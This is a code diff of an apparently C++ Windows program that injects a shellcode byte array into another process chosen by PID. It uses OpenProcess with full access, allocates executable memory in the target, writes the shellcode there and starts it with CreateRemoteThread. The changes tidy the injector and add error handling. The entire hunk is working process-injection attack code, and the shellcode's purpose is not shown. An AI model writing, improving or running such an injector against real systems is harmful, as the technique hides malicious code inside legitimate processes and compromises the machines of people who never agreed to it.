@@ -41,15 +41,17 @@ unsigned char shellcode[] =
 "\xfc\x34\x49\xc3\xa1\x46\x5e\x62\xa1\x0d\xf4\xf8\xb8\xb4"
 "\xca\xe8\xd4\x51\x0e\x36\x71\x39\x70\x82\xd4\x08\x4f";
 
-	HANDLE processHandle;
-	HANDLE remoteThread;
-	PVOID remoteBuffer;
 
-	printf("Injecting to PID: %i", atoi(argv[1]));
-	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
-	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
-	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
-	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
+
+	printf("injecting into PID: %i", atoi(argv[1]));
+    HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
+    if (!processHandle) {
+        printf("Failed to open process. Error: (%u)", GetLastError());
+        return 1;
+    }
+	auto remoteBuff = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
+	WriteProcessMemory(processHandle, remoteBuff, shellcode, sizeof shellcode, NULL);
+	auto remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuff, NULL, 0, NULL);
 	CloseHandle(processHandle);
 
     return 0;
